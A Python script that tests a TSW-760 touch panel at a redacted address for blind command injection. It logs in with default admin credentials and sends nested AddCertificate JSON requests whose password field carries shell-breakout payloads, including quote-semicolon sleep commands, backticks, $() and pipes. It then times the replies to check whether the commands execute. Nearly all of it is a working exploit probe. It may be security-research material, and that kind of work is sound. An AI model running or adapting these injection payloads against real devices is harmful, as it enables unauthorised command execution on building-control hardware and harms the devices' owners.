#!/usr/bin/env python3
"""
TSW-760 Nested Cert Format Timing Analysis
Target: [REDACTED-IP] (TSW-760, FW 2.009.0122.001, API 2.1.0)

Tests whether the nested AddCertificate JSON format reaches system() by 
measuring response time correlation with injected sleep commands.

The nested format {"Device":{"CertificateStore":{"AddCertificate":{...,"Type":"WebServer"}}}}
caused a 30-second timeout previously — need to determine if that's a fixed timeout
or if injected commands are actually executing.
"""
import requests
import time
import json
import sys
import urllib3
urllib3.disable_warnings()

TARGET = "[REDACTED-IP]"
BASE_URL = f"https://{TARGET}"
CREDS = ("admin", "admin")
TIMEOUT = 90  # Extended timeout to handle 30s+ responses

def send_nested_cert(password, cert="test.pfx", cert_type="WebServer"):
    """Send AddCertificate in nested JSON format"""
    url = f"{BASE_URL}/Device/CertificateStore"
    payload = {
        "Device": {
            "CertificateStore": {
                "AddCertificate": {
                    "password": password,
                    "certificate": cert,
                    "Type": cert_type
                }
            }
        }
    }
    headers = {"Content-Type": "application/json"}
    start = time.time()
    try:
        resp = requests.post(url, json=payload, auth=CREDS, headers=headers,
                           verify=False, timeout=TIMEOUT)
        elapsed = time.time() - start
        return resp.status_code, elapsed, resp.text[:200]
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        return None, elapsed, "TIMEOUT"
    except Exception as e:
        elapsed = time.time() - start
        return None, elapsed, str(e)

def send_nested_cert_alt(password, cert="test.pfx"):
    """Send AddCertificate with WebServer as key instead of Type field"""
    url = f"{BASE_URL}/Device/CertificateStore"
    payload = {
        "Device": {
            "CertificateStore": {
                "WebServer": {
                    "AddCertificate": {
                        "password": password,
                        "certificate": cert
                    }
                }
            }
        }
    }
    headers = {"Content-Type": "application/json"}
    start = time.time()
    try:
        resp = requests.post(url, json=payload, auth=CREDS, headers=headers,
                           verify=False, timeout=TIMEOUT)
        elapsed = time.time() - start
        return resp.status_code, elapsed, resp.text[:200]
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        return None, elapsed, "TIMEOUT"
    except Exception as e:
        elapsed = time.time() - start
        return None, elapsed, str(e)

print("="*80)
print(f"TSW-760 Nested Cert Timing Analysis — {TARGET}")
print(f"Timeout: {TIMEOUT}s")
print("="*80)

# ============================================================
# PHASE 1: Establish baselines with the nested format
# ============================================================
print("\n[PHASE 1] Baseline — Normal password, nested format with Type field")
print("-" * 60)

baselines = []
for i in range(3):
    code, t, body = send_nested_cert("normalpassword")
    print(f"  Baseline {i+1}: HTTP {code} | {t:.3f}s | {body[:100]}")
    baselines.append(t)
    time.sleep(2)  # Brief pause between requests

avg_baseline = sum(baselines) / len(baselines)
print(f"\n  Average baseline: {avg_baseline:.3f}s")

# ============================================================
# PHASE 2: Injection tests with sleep commands
# ============================================================
print("\n[PHASE 2] Sleep injection tests — nested format")
print("-" * 60)

# Standard single-quote breakout ([REDACTED-ID]_001 pattern)
injections = [
    ("No injection (control)", "normalpassword"),
    ("Sleep 0 (control)", "test';sleep 0;echo '"),
    ("Sleep 3", "test';sleep 3;echo '"),
    ("Sleep 5", "test';sleep 5;echo '"),
    ("Sleep 10", "test';sleep 10;echo '"),
    ("Backtick sleep 3", "test`sleep 3`"),
    ("$() sleep 3", "test$(sleep 3)"),
    ("Semicolon sleep 3", "test;sleep 3;"),
    ("Pipe sleep 3", "test|sleep 3|"),
    ("Newline sleep 3", "test\nsleep 3\n"),
]

results = []
for label, payload in injections:
    print(f"\n  [{label}]")
    print(f"    Payload: {repr(payload)}")
    code, t, body = send_nested_cert(payload)
    print(f"    Result:  HTTP {code} | {t:.3f}s | {body[:100]}")
    results.append((label, payload, t, code, body))
    time.sleep(3)  # Longer pause to let device recover

# ============================================================
# PHASE 3: Try alternate nested format (WebServer as key)
# ============================================================
print("\n\n[PHASE 3] Alternate nested format — WebServer as key")
print("-" * 60)

alt_tests = [
    ("Alt baseline", "normalpassword"),
    ("Alt sleep 3", "test';sleep 3;echo '"),
    ("Alt sleep 5", "test';sleep 5;echo '"),
]

for label, payload in alt_tests:
    print(f"\n  [{label}]")
    code, t, body = send_nested_cert_alt(payload)
    print(f"    Result: HTTP {code} | {t:.3f}s | {body[:100]}")
    time.sleep(3)

# ============================================================
# PHASE 4: Summary and timing correlation
# ============================================================
print("\n\n" + "="*80)
print("TIMING CORRELATION ANALYSIS")
print("="*80)
print(f"\nBaseline average: {avg_baseline:.3f}s")
print(f"\nInjection Results:")
print(f"{'Label':<25} {'Expected':>10} {'Actual':>10} {'Delta':>10} {'Correlated?':>12}")
print("-" * 70)

for label, payload, t, code, body in results:
    expected = avg_baseline
    if "Sleep 3" in label or "sleep 3" in label:
        expected = avg_baseline + 3
    elif "Sleep 5" in label or "sleep 5" in label:
        expected = avg_baseline + 5
    elif "Sleep 10" in label or "sleep 10" in label:
        expected = avg_baseline + 10
    
    delta = t - avg_baseline
    correlated = "YES ✓" if abs(t - expected) < 1.5 else "NO"
    print(f"  {label:<25} {expected:>8.1f}s {t:>8.1f}s {delta:>+8.1f}s {correlated:>12}")

print("\nDone.")
